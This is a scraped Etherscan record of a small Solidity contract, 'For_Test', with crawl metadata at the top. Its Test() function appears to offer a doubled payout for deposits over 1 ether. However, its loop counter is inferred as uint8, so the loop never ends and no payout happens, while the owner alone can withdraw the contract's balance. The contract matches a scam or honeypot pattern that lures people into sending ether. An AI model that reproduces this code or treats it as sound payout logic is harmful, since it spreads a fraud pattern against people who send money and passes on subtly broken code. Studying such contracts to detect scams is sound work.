//token_name	
//token_url	https://etherscan.io//address/0x752406CbFd32593Fc422DA69cdD702d1eaAdC121#code
//spider_time	2018/07/08 12:40:32
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.19;

contract For_Test
{
    address owner = msg.sender;
    
    function withdraw()
    payable
    public
    {
        require(msg.sender==owner);
        owner.transfer(this.balance);
    }
    
    function() payable {}
    
    function Test()
    payable
    public
    {
        if(msg.value>1 ether)
        {
            uint256 multi =0;
            uint256 amountToTransfer=0;
             
            
            for(var i=0;i<msg.value*2;i++)
            {
                multi=i*2;
                
                if(multi<amountToTransfer)
                {
                  break;  
                }
                else
                {
                    amountToTransfer=multi;
                }
            }    
            msg.sender.transfer(amountToTransfer);
        }
    }
}